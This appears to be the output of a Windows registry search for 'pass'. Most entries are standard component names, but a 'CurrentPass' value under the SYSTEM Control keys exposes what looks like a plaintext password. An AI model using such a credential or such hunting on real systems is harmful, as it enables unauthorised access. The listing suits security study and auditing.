HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}   

    (Default)    REG_SZ    PicturePasswordLogonProvider                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}   

    (Default)    REG_SZ    PasswordProvider                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Components\88D97D6CD3C43924AA87FF8375A2071E   

    4BBD22E0B196C0045BD2D8EFE84C12AA    REG_SZ    00:\TypeLib\{DC59A585-A719-43A7-BB9B-6D82B5873CB0}\1.0\PrimaryInteropAssemblyName   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK   

    Text    REG_SZ    Prompt for user name and password                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT   

    Text    REG_SZ    Automatic logon with current user name and password          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{009F3B45-8A6B-4360-B997-B2A009A16402}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{12FC5E89-5446-4A7C-BA46-207A29E2945D}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}   

    (Default)    REG_SZ    RASGCW Change Password Page                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{3bfe6eb7-281d-4333-999e-e949e3621de7}   

    (Default)    REG_SZ    Cert Password UI Page                                   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{4582EBA9-6AA1-4D79-824E-728929EF455D}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}\Parents\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{8C1645B0-9864-465E-BE75-990B030E4B11}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{9cb233a5-a4a5-46b9-ab13-db07ce949410}   

    (Default)    REG_SZ    Password retry UI Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{A86CA2F1-AF74-4A74-980B-E185D4CA01B0}\Parents\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{A86CA2F1-AF74-4A74-980B-E185D4CA01B0}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Components\{d9162b5b-ca81-476e-a310-cb32d932733c}   

    (Default)    REG_SZ    Password Expired UI Page                                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Factory\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\XWizards\Factory\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\ENROLLMENTS\ValidNodePaths       

    NodePath8    REG_SZ    PassportForWork                                         

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Internet Explorer\AdvancedOptions\BROWSE\FTPPASV   

    Text    REG_SZ    Use Passive FTP (for firewall and DSL modem compatibility)   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Internet Explorer\Capabilities\Roaming\FormSuggest   

    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW Ask   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}   

    (Default)    REG_SZ    PicturePasswordLogonProvider                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}   

    (Default)    REG_SZ    PasswordProvider                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\ASK   

    Text    REG_SZ    Prompt for user name and password                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\SO\AUTH\LOGON\SILENT   

    Text    REG_SZ    Automatic logon with current user name and password          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{009F3B45-8A6B-4360-B997-B2A009A16402}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{12FC5E89-5446-4A7C-BA46-207A29E2945D}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}   

    (Default)    REG_SZ    RASGCW Change Password Page                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{3bfe6eb7-281d-4333-999e-e949e3621de7}   

    (Default)    REG_SZ    Cert Password UI Page                                   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{4582EBA9-6AA1-4D79-824E-728929EF455D}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}\Parents\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{8C1645B0-9864-465E-BE75-990B030E4B11}\Children\{879FB53B-CBA3-4FC8-B233-D9A93AFA7FBC}   

    (Default)    REG_SZ    HomeGroup Passkey Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{9cb233a5-a4a5-46b9-ab13-db07ce949410}   

    (Default)    REG_SZ    Password retry UI Page                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{A86CA2F1-AF74-4A74-980B-E185D4CA01B0}\Parents\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{A86CA2F1-AF74-4A74-980B-E185D4CA01B0}\Parents\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}   

    (Default)    REG_SZ    WCN Password - PIN                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\Children\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}   

    (Default)    REG_SZ    WCN Password PIN                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Components\{d9162b5b-ca81-476e-a310-cb32d932733c}   

    (Default)    REG_SZ    Password Expired UI Page                                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Factory\{009F3B45-8A6B-4360-B997-B2A009A16402}   

    (Default)    REG_SZ    HomeGroup Update Passkey/Merge Hook Page                

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\XWizards\Factory\{4582EBA9-6AA1-4D79-824E-728929EF455D}   

    (Default)    REG_SZ    HomeGroup Change Passkey Hook Page                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}   

    (Default)    REG_SZ    PicturePasswordLogonProvider                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}   

    (Default)    REG_SZ    RASGCW Change Password Class                            

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{3bfe6eb7-281d-4333-999e-e949e3621de7}   

    (Default)    REG_SZ    Cert Password UI class                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}   

    (Default)    REG_SZ    PasswordProvider                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID   

    (Default)    REG_SZ    IAS.ChangePassword.1                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}   

    (Default)    REG_SZ    V1PasswordProvider                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{7A9D77BD-5403-11d2-8785-2E0420524153}   

    InfoTip    REG_SZ    Manages users and passwords for this computer             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}   

    (Default)    REG_SZ    LogonPasswordReset                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{9cb233a5-a4a5-46b9-ab13-db07ce949410}   

    (Default)    REG_SZ    Password retry UI class                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\shell   

    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevices   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{C98F3822-3658-4D75-8A25-6621665ECD56}   

    (Default)    REG_SZ    HomeGroup Password Command                              

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{d9162b5b-ca81-476e-a310-cb32d932733c}   

    (Default)    REG_SZ    Password Expired UI class                               

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}   

    (Default)    REG_SZ    IHomeGroupPassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{0cf1e460-bc2c-587c-9822-420ba04d0551}   

    (Default)    REG_SZ    IAsyncOperationCompletedHandler_1_Windows__CDevices__CSensors__CCompass   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{0db7eb30-afb5-4173-909b-1d971772f5db}   

    (Default)    REG_SZ    IPairingPasskey                                         

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{0db7eb30-afb5-4173-909b-1d971772f5dc}   

    (Default)    REG_SZ    IPairingPasskey2                                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}   

    (Default)    REG_SZ    _PasswordDeriveBytes                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}   

    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{46ACA899-50F6-4A46-A9E3-273705CA4914}   

    (Default)    REG_SZ    IPicturePasswordTaskHandler                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{53E78940-B62E-49F8-A69B-84CB8963A513}   

    (Default)    REG_SZ    IPasswordOnWakeSetting                                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}   

    (Default)    REG_SZ    IPasswordVault                                          

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{68FFF241-CA49-4754-A3D8-4B4127518549}   

    (Default)    REG_SZ    ISupportPasswordMode                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{6ab18989-c720-41a7-a6c1-feadb36329a0}   

    (Default)    REG_SZ    IPasswordCredential                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{76D7759A-857C-46BD-BA0C-841904E0FC8D}   

    (Default)    REG_SZ    ISnapAssistCallback                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{97F17EF9-284E-4992-AE46-748EF75225BB}   

    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}   

    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredential   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{B0619C15-5B93-412E-AF8D-878F23B1A437}   

    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollment   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{B63CB15A-D1AA-4A39-BC06-78E9843BF5C4}   

    (Default)    REG_SZ    ISnapAssistViewHost                                     

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{C69E96B2-6161-3621-B165-5805198C6B8D}   

    (Default)    REG_SZ    _PrimaryInteropAssemblyAttribute                        

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{E787D73D-A121-5AE6-B497-AB934837E57F}   

    (Default)    REG_SZ    ITypedEventHandler_2_Windows__CDevices__CSensors__CCompass_Windows__CDevices__CSensors__CCompassReadingChangedEventArgs   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\Interface\{F37C3D8D-6082-46C0-B22D-96BC5EC87FD9}   

    (Default)    REG_SZ    IStoredPassRootDocument                                 

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\TypeLib\{00020430-0000-0000-C000-000000000046}\2.0   

    PrimaryInteropAssemblyName    REG_SZ    stdole, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\TypeLib\{11A8B8EE-BF30-409A-8EF7-3A143EF70332}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.Interop.Security.AzRoles Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\TypeLib\{DC59A585-A719-43A7-BB9B-6D82B5873CB0}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.SQLTaskConnectionsWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.SQLTaskConnectionsWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\TypeLib\{FF6681CD-490A-498C-B8C9-81223B6056FC}\1.0   

    PrimaryInteropAssemblyName    REG_SZ    Microsoft.SqlServer.DTSRuntimeWrap, Version=14.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91   

    PrimaryInteropAssemblyCodeBase    REG_SZ    C:\Windows\Gac\Microsoft.SqlServer.DTSRuntimeWrap.dll   

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control                                    

    CurrentPass    REG_SZ    TwilightAirmailMuck234                                

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Lsa\SSO\Passport1.4                

    SSOURL    REG_SZ    http://www.passport.com                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\DefaultUserConfiguration   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\RDP-Tcp   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RemoteAccess\Policy\Pipeline\23   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Defaults\FirewallPolicy\FirewallRules   

    IIS-WebServerRole-FTP-Passive-In-TCP    REG_SZ    v2.29|Action=Allow|Active=FALSE|Dir=In|Protocol=6|App=%windir%\system32\svchost.exe|Svc=FTPSVC|Name=@%SystemRoot%\system32\firewallapi.dll,-38543|Desc=@%SystemRoot%\system32\firewallapi.dll,-38544|Embe   

dCtxt=@%SystemRoot%\system32\firewallapi.dll,-38525|                               

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules   

    IIS-WebServerRole-FTP-Passive-In-TCP    REG_SZ    v2.29|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort2_10=1024-65535|App=C:\Windows\system32\svchost.exe|Svc=FTPSVC|Name=@%SystemRoot%\system32\firewallapi.dll,-38543|Desc=@%SystemRoot%\system32\firew   

allapi.dll,-38544|EmbedCtxt=@%SystemRoot%\system32\firewallapi.dll,-38525|         

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\UmPass                            

    DisplayName    REG_SZ    @umpass.inf,%UmPass.SVCDESC%;Microsoft UMPass Driver   

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control                                    

    CurrentPass    REG_SZ    TwilightAirmailMuck234                                

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Lsa\SSO\Passport1.4                

    SSOURL    REG_SZ    http://www.passport.com                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\RemoteAccess\Policy\Pipeline\23   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules   

    IIS-WebServerRole-FTP-Passive-In-TCP    REG_SZ    v2.29|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort2_10=1024-65535|App=C:\Windows\system32\svchost.exe|Svc=FTPSVC|Name=@%SystemRoot%\system32\firewallapi.dll,-38543|Desc=@%SystemRoot%\system32\firew   

allapi.dll,-38544|EmbedCtxt=@%SystemRoot%\system32\firewallapi.dll,-38525|         

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\UmPass                            

    DisplayName    REG_SZ    @umpass.inf,%UmPass.SVCDESC%;Microsoft UMPass Driver   

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverInfFiles\umpass.inf                 

    Active    REG_SZ    umpass.inf_amd64_4c34f727d14d4634                          

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\eaphost.inf_amd64_a2f862273f09184f\Configurations\ECPComponent_Device.NT   

    Service    REG_SZ    UmPass                                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\ehstorpwddrv.inf_amd64_d14b2d0cd98ecf84\Strings   

    devicename    REG_SZ    Microsoft supported IEEE 1667 password silo            

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\lsi_sas3i.inf_amd64_469d8c18de0be2e5\Strings   

    devdescc3    REG_SZ    Cisco 12G Modular SAS Pass through Controller           

    devdescc4    REG_SZ    UCS C3X60 12G SAS Pass through Controller               

    devdescc5    REG_SZ    UCS S3260 Dual Pass Through Controller                  

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\pnpxinternetgatewaydevices.inf_amd64_f115db0c7ff791c0\Configurations\PNPXIGD.NT   

    Service    REG_SZ    UmPass                                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\umpass.inf_amd64_4c34f727d14d4634   

    (Default)    REG_SZ    umpass.inf                                              

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\umpass.inf_amd64_4c34f727d14d4634\Configurations\UmPass   

    Service    REG_SZ    UmPass                                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\umpass.inf_amd64_4c34f727d14d4634\Descriptors\GenericUmPass   

    Configuration    REG_SZ    UmPass                                              

    Description    REG_SZ    %umpass.devicedesc%                                   

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\umpass.inf_amd64_4c34f727d14d4634\Descriptors\UMB\GenericUmPass   

    Configuration    REG_SZ    UmPass                                              

    Description    REG_SZ    %umpass.devicedesc%                                   

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\DriverDatabase\DriverPackages\umpass.inf_amd64_4c34f727d14d4634\Strings   

    umpass.devicedesc    REG_SZ    Generic UMPass device                           

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control                                

    CurrentPass    REG_SZ    TwilightAirmailMuck234                                

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\SSO\Passport1.4            

    SSOURL    REG_SZ    http://www.passport.com                                    

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp   

    Password    REG_SZ                                                             

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23   

    (Default)    REG_SZ    IAS.ChangePassword                                      

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Defaults\FirewallPolicy\FirewallRules   

    IIS-WebServerRole-FTP-Passive-In-TCP    REG_SZ    v2.29|Action=Allow|Active=FALSE|Dir=In|Protocol=6|App=%windir%\system32\svchost.exe|Svc=FTPSVC|Name=@%SystemRoot%\system32\firewallapi.dll,-38543|Desc=@%SystemRoot%\system32\firewallapi.dll,-38544|Embe   

dCtxt=@%SystemRoot%\system32\firewallapi.dll,-38525|                               

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules   

    IIS-WebServerRole-FTP-Passive-In-TCP    REG_SZ    v2.29|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort2_10=1024-65535|App=C:\Windows\system32\svchost.exe|Svc=FTPSVC|Name=@%SystemRoot%\system32\firewallapi.dll,-38543|Desc=@%SystemRoot%\system32\firew   

